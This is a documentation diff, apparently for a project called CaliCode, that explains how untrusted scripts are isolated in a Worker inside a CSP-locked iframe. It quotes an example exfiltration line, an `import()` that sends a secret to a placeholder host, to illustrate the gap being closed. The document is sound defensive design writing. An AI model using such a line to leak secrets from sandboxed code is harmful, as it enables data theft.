@@ -67,24 +67,19 @@ Project scripts run in a sandboxed Worker with `fetch`, `XMLHttpRequest`,
 `WebSocket`, `postMessage` and friends deleted along the whole prototype
 chain, so a script from an untrusted project cannot reach the RPC surface.
 
-**Known gap:** dynamic `import()` is syntax rather than a property, so it
-cannot be removed this way — `import("http://host/?" + secret)` remains a GET
-exfiltration path.
+Isolation is two layers, because neither is sufficient alone. A Worker gives
+thread isolation, so `while (true) {}` is contained and terminated — but a
+Worker cannot carry a Content-Security-Policy, and dynamic `import()` is
+syntax rather than a property, so no amount of global hardening refuses
+`import("http://host/?" + secret)`. A CSP iframe refuses both `import()` and
+every network call — but a same-process iframe shares the main thread, so an
+infinite loop freezes the editor.
 
-A CSP-locked, opaque-origin iframe *does* close it — `lib/frameSandbox.ts`
-implements one, and both `fetch` and `import()` were measured as refused
-inside it. It is not the default, because a same-process iframe shares the
-main thread: a script containing `while (true) {}` blocks the parent's event
-loop, the step timeout never fires, and the whole editor hangs. A Worker runs
-on its own thread and the same script is terminated in 2s. Hanging the
-application is worse than the remaining GET channel, so the Worker stays.
-
-Closing both properly means running a Worker *inside* the CSP frame. Until
-then, treat `import()` as open and only run projects you trust. The gap is
-kept visible as a skipped `test.fixme` in `e2e/sandbox.spec.ts` rather than
-left undocumented. Scripts see plain
-vectors and return a transform patch; they never touch three.js objects
-directly. A step that runs longer than 2s terminates the worker.
+CaliCode runs the Worker *inside* a CSP-locked, opaque-origin iframe. The
+worker inherits `connect-src 'none'` and a `script-src` that permits no URL
+source, while keeping its own thread. Measured in a browser and asserted in
+`e2e/sandbox.spec.ts`: a `fetch` to `/rpc` is refused, `import()` of it is
+refused, and a spinning script is terminated in 2s without touching the UI.
 
 Scripted tests run in their own sandboxed Worker. They genuinely need
 main-thread capabilities — stepping PIE, comparing baselines through core — so
